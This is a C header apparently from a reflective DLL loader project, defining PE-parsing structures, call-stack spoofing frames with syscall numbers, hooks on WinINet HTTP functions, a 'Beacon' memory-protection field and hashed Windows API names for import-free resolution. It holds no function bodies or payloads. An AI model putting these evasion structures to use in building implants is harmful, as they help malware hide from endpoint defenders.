//
// Created by Jm on 2024/6/21.
//

#ifndef STACK_CALL_PROJSTRUCTS_H
#define STACK_CALL_PROJSTRUCTS_H
#include <Windows.h>
#define FUNC_ADDRESS(func) ((uintptr_t)(void *)(func))
__MINGW_EXTENSION typedef unsigned long long   uint64_t;
#define GRP_SEC( x ) __attribute__(( section( ".text$" #x ) ))
#define STATUS_SUCCESS 0x0
#define RBP_OP_INFO 0x5
#define true 1


typedef struct _STRING
{
    WORD Length;
    WORD MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;
typedef struct _UNICODE_STRING
{
    WORD Length;
    WORD MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING, **PPUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;
typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;
typedef CONST BYTE *PCSZ;
/*
 * 函数签名
 */

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;
typedef PVOID  (WINAPI *tLoadLibraryA)(LPCSTR lpLibFileName);
typedef NTSTATUS (NTAPI* tTPSIMPLETRYPOST)(_In_ PTP_SIMPLE_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron);
typedef long(NTAPI* tNtQueryVirtualMemory)( HANDLE ProcessHandle, PVOID  BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID  MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef LONG32(NTAPI* t_NtQueryInformationThread)( HANDLE ThreadHandle, DWORD ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);
typedef PVOID  (WINAPI * t_LoadLibraryExA)  (BYTE *lpLibFileName,HANDLE hFile,DWORD  dwFlags);
typedef PVOID  (WINAPI * tGetProcAddress)(PVOID, BYTE*);
typedef LONG32 (NTAPI  * tNtProt)        (PVOID, PVOID, PVOID, DWORD, PVOID);
typedef LONG32 (NTAPI  * tNtAlloc)       (PVOID, PVOID, DWORD *, PSIZE_T, DWORD, DWORD);
typedef LONG32 (NTAPI  * tNtFree)        (PVOID, PVOID, PSIZE_T, DWORD);
typedef HANDLE(WINAPI* t_CreateFileMappingA)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
typedef PVOID (WINAPI* t_MapViewOfFile)( HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef NTSTATUS(NTAPI  * t_LdrGetProcedureAddress)( IN PVOID  DllHandle, IN OPTIONAL PANSI_STRING ProcedureName, IN OPTIONAL ULONG ProcedureNumber, OUT PVOID  *ProcedureAddress);
typedef NTSTATUS (NTAPI * t_RtlAnsiStringToUnicodeString)(PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString);
typedef VOID (NTAPI * t_RtlFreeUnicodeString)(PUNICODE_STRING UnicodeString);
typedef VOID (NTAPI * t_RtlInitAnsiString)(PANSI_STRING DestinationString, PCSZ SourceString);
typedef NTSTATUS (NTAPI * t_LdrLoadDll)(OPTIONAL PWSTR DllPath, OPTIONAL PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID  *DllHandle);
typedef long(NTAPI* tNtQueryVirtualMemory)( HANDLE ProcessHandle, PVOID  BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID  MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef NTSTATUS  (NTAPI * t_NtUnmapViewOfSection)( IN HANDLE ProcessHandle, IN PVOID  BaseAddress);
typedef PVOID    (NTAPI * tNtDelayExecution)( BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
typedef PVOID  (WINAPI * tGetProcessHeap)();
typedef PVOID  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef PVOID  (WINAPI * tHeapFree) (HANDLE, DWORD, PVOID);
typedef DWORD (WINAPI *tWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef int (WINAPI *tMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
typedef PVOID  (WINAPI * DLLMAIN)( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved);


#define HINTERNET PVOID
LPVOID InternetOpenA_Hook(BYTE* lpszAgent, DWORD dwAccessType, BYTE* lpszProxy, BYTE* lpszProxyBypass, DWORD  dwFlags);
LPVOID InternetConnectA_Hook(PVOID hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
LPVOID HttpOpenRequestA_Hook(PVOID hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
BOOL HttpSendRequestA_Hook(PVOID hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL InternetReadFile_Hook(PVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
BOOL InternetQueryDataAvailable_Hook(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
BOOL InternetCloseHandle_Hook(HINTERNET hInternet);
BOOL InternetQueryOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
BOOL InternetSetOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
BOOL InternetSetStatusCallback_Hook(HINTERNET hInternet, PVOID lpfnInternetCallback);
BOOL HttpAddRequestHeadersA_Hook(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
BOOL HttpQueryInfoA_Hook(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

typedef LPVOID(* t_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef LPVOID(* t_InternetConnectA)(HANDLE, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef LPVOID(* t_HttpOpenRequestA)(LPVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL(* t_HttpSendRequestA)(LPVOID, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(* t_InternetReadFile)(LPVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL(* t_InternetQueryDataAvailable)(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL(* t_InternetCloseHandle)(LPVOID);
typedef BOOL(* t_InternetQueryOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
typedef BOOL(* t_InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL(* t_InternetSetStatusCallback)(HINTERNET hInternet, PVOID lpfnInternetCallback);
typedef BOOL(* t_HttpAddRequestHeadersA)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
typedef BOOL(* t_HttpQueryInfoA)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

/*
 * 自定义
 */

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    WORD FrameOffset;
} UNWIND_CODE, * PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, * PUNWIND_INFO;

typedef PRUNTIME_FUNCTION (NTAPI * tRtlLookupFunctionEntry)(
        DWORD64 ControlPc,
        PDWORD64 ImageBase,
        PUNWIND_HISTORY_TABLE HistoryTable
);
typedef struct StackFrame
{
    LPCWSTR dllPath;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID  returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;
} StackFrame, * PStackFrame;
typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;
typedef struct Spoof_Struct
{
    PVOID Fixup;                     // +0x00
    PVOID original_return_address;   // +0x08
    PVOID rbx;                       // +0x10
    PVOID rdi;                       // +0x18
    PVOID frame_1_stack_frame_size;  // +0x20 BaseThreadInitThunk stack frame size
    PVOID frame_1_return_address;    // +0x28 BaseThreadInitThunk + 0x14
    PVOID gadget_stack_frame_size;   // +0x30
    PVOID frame_0_stack_frame_size;  // +0x38 RtlUserThreadStart  stack frame size
    PVOID frame_0_return_address;    // +0x40 RtlUserThreadStart + 0x21
    PVOID ssn;                       // +0x48
    PVOID gadget_return_address;     // +0x50
    PVOID rsi;                       // +0x58
    PVOID r12;                       // +0x60
    PVOID r13;                       // +0x68
    PVOID r14;                       // +0x70
    PVOID r15;                       // +0x78
    PVOID frame_2_stack_frame_size;  // +0x80 ThreadStartAddress  stack frame size
    PVOID frame_2_return_address;    // +0x88 ThreadStartAddress
} Spoof_Struct, * pSpoof_Struct;

typedef struct Section {
    PVOID RVA;
    PVOID dst_rdll_VA;
    PVOID src_rdll_VA;
    PVOID PointerToRawData;
    DWORD SizeOfSection;
    DWORD Characteristics;
}Section;
typedef struct wininet_apis
{
    t_InternetOpenA               InternetOpenA;
    t_InternetConnectA            InternetConnectA;
    t_HttpOpenRequestA            HttpOpenRequestA;
    t_HttpSendRequestA            HttpSendRequestA;
    t_InternetReadFile            InternetReadFile;
    t_InternetQueryDataAvailable  InternetQueryDataAvailable;
    t_InternetCloseHandle         InternetCloseHandle;
    t_InternetQueryOptionA        InternetQueryOptionA;
    t_InternetSetOptionA          InternetSetOptionA;
    t_InternetSetStatusCallback   InternetSetStatusCallback;
    t_HttpAddRequestHeadersA      HttpAddRequestHeadersA;
    t_HttpQueryInfoA              HttpQueryInfoA;
}wininet_apis;
typedef struct Export {
    PVOID   Directory;
    DWORD DirectorySize;
    PVOID   AddressTable;
    PVOID   NameTable;
    PVOID   OrdinalTable;
    DWORD NumberOfNames;
}Export;

typedef struct Dll {
    PVOID dllBase;
    DWORD size;
    DWORD SizeOfHeaders;
    PVOID OptionalHeader;
    unsigned short SizeOfOptionalHeader;
    PVOID NthSection;
    DWORD NumberOfSections;
    DWORD BeaconMemoryProtection;
    PVOID EntryPoint;
    PVOID text_section;
    DWORD text_section_size;
    PVOID pdata_section;
    DWORD pdata_section_size;
    Export Export;
    ULONG_PTR obfuscate;
    BYTE xor_key;
    BYTE* Name;
    IMAGE_DOS_HEADER         * dos_header;
    IMAGE_FILE_HEADER        * file_header;
    IMAGE_OPTIONAL_HEADER64  * optional_header;
    unsigned short             optional_header_size;
    IMAGE_EXPORT_DIRECTORY   * export_directory;
    IMAGE_SECTION_HEADER     * section_header;
    IMAGE_DATA_DIRECTORY     * data_directory;
    VOID                     * import_directory;
    DWORD              import_directory_size;
}Dll, *PDll;

typedef struct HEAP_APIS{
    tGetProcessHeap GetProcessHeap;
    tHeapAlloc      HeapAlloc;
    tHeapFree       HeapFree;
}HEAP_APIS;

typedef struct APIS {
    struct ker32 {
        tLoadLibraryA LoadLibraryA;
        t_LoadLibraryExA LoadLibraryEx;
        t_CreateFileMappingA CreateFileMappingA;
        t_MapViewOfFile MapViewOfFile;
        tHeapAlloc HeapAlloc;
        tGetProcessHeap GetProcessHeap;
    } ker32;

    struct ntdll {
        t_LdrGetProcedureAddress LdrGetProcedureAddress;
        t_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString;
        t_RtlFreeUnicodeString RtlFreeUnicodeString;
        t_RtlInitAnsiString RtlInitAnsiString;
        t_LdrLoadDll LdrLoadDll;
        t_NtUnmapViewOfSection NtUnmapViewOfSection;
        tNtQueryVirtualMemory NtQueryVirtualMemory;
        PVOID pNtAllocateVirtualMemory;
        PVOID pNtProtectVirtualMemory;
        PVOID pNtFreeVirtualMemory;
        tRtlLookupFunctionEntry RtlLookupFunctionEntry;
        tTPSIMPLETRYPOST TpSimpleTryPost;
    } ntdll;
} APIS;


/*
 * 执行回调函数
 */
extern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
// 声明汇编函数原型

/*
 *   HASH
 */

#define NTQUERYVIRTUALMEMORY         0x5d4bc34a  // ntqueryvirtualmemory
#define LDRGETPROCEDUREADDRESS       0x67c04785  // ldrgetprocedureaddress
#define RTLINITANSISTRING            0xe60378c2  // rtlinitansistring
#define NTALLOCATEVIRTUALMEMORY      0x103d64df  // ntallocatevirtualmemory
#define NTPROTECTVIRTUALMEMORY       0xbc028cc7  // ntprotectvirtualmemory
#define NTFREEVIRTUALMEMORY          0x7ccb7f20  // ntfreevirtualmemory
#define LDRLOADDLL                   0x8a1a1fc2  // ldrloaddll
#define RTLANSISTRINGTOUNICODESTRING 0x11027ab9  // rtlansistringtounicodestringring
#define LDRGETPROCEDUREADDRESS       0x67c04785  // ldrgetprocedureaddress
#define RTLFREEUNICODESTRING         0x4ec50e0e  // rtlfreeunicodestring
#define RTLINITANSISTRING            0xe60378c2  // rtlinitansistring
#define NTUNMAPVIEWOFSECTION         0xc4a552c4  // ntunmapviewofsection
#define NTQUERYVIRTUALMEMORY         0x5d4bc34a  // ntqueryvirtualmemory
#define LOADLIBRARYEXA               0xad631535  // loadlibraryexa
#define CREATEFILEMAPPINGA           0x6bdc31f3  // createfilemappinga
#define MAPVIEWOFFILE                0xa1c75a38  // mapviewoffile
#define GETPROCESSHEAP               0x210dd79f  // getprocessheap
#define HEAPFREE                     0xbc0be1c0  // heapfree
#define RTLALLOCATEHEAP              0x2cf6348b  // rtlallocateheap
#define HEAPALLOC                    0xe9cc7d0b  // heapalloc
#define RTLUSERTHREADSTART           0x9d1bbd03  // rtluserthreadstart
#define BASETHREADINITTHUNK          0x08620361  // basethreadinitthunk
#define RTLLOOKUPFUNCTIONENTRY       0xf0b21bc0  // rtllookupfunctionentry
#define NTDELAYEXECUTION             0x2bd49771  // ntdelayexecution
#define INTERNETOPENA                0x9655ac2c  // internetopena
#define INTERNETCONNECTA             0x4215bb14  // internetconnecta
#define HTTPOPENREQUESTA             0xf966ee7c  // httpopenrequesta
#define HTTPSENDREQUESTA             0xe8bda4aa  // httpsendrequesta
#define INTERNETREADFILE             0xf7db660f  // internetreadfile
#define INTERNETQUERYDATAAVAILABLE   0xb0dd8fe6  // internetquerydataavailablele
#define INTERNETCLOSEHANDLE          0x9d2b4e39  // internetclosehandle
#define INTERNETQUERYOPTIONA         0x967fe661  // internetqueryoptiona
#define INTERNETSETOPTIONA           0x04e8f661  // internetsetoptiona
#define INTERNETSETSTATUSCALLBACK    0x968fb04a  // internetsetstatuscallbackk
#define HTTPADDREQUESTHEADERSA       0x45811601  // httpaddrequestheadersa
#define HTTPQUERYINFOA               0x0512ca9f  // httpqueryinfoa
#define NTQUERYINFORMATIONTHREAD     0x11eb72c4  // ntqueryinformationthread
#define NTDLL                        0xfb4e1a2c  // ntdll.dll
#define KERNEL32                     0x0ad9a9a6  // kernel32.dll
#define WININET                      0x35847a6e  // wininet.dll
#define USER32                       0xA0CA6BD8  // user32.dll
#define SLEEP                        0xb60c818f  // sleep
#define TPSIMPLETRYPOST              0x3f60b2fd //  TpSimpleTryPost
#define WAITFORSINGLEOBJECT          0xB3E73AC3  //WaitForSingleObject
#define MESSAGEBOXA                 0x1085A6C7  //MessageBoxA


#endif //STACK_CALL_PROJSTRUCTS_H
